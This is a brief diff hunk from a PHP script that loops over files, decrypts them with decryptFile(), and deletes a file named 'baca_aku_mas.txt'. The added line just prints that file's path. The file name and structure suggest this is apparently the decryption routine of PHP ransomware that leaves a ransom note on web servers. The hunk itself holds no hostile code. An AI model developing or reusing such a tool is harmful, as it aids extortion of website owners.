@@ -46,6 +46,7 @@
 					$base = file_get_contents($filename);
 					decryptFile($base, $filename);	
 				}elseif($filename === 'baca_aku_mas.txt'){
+					echo $dir."/baca_aku_mas.txt";
 					unlink($dir."/baca_aku_mas.txt");
 				}
 		    }else{
